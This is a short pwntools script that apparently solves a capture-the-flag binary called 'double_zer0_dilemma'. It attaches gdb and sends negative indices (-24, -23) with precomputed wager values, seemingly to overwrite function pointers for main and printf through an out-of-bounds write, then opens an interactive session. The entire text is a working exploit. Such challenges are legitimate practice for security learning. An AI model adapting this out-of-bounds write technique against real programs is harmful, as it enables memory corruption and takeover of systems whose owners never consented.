from pwn import *

p = process("./double_zer0_dilemma")
gdb.attach(p)

double_for_main = 265368770
ldouble_for_printf = 4198464 #(not times two since srand is used before division)

p.recvuntil(b"land on:")
p.sendline(b"-24")
p.recvuntil(b"wager:")
p.sendline(f"{str(double_for_main)}".encode())

p.recvuntil(b"land on:")
p.sendline(b"-23")
p.recvuntil(b"wager:")
p.sendline(f"{str(ldouble_for_printf)}".encode())

p.interactive()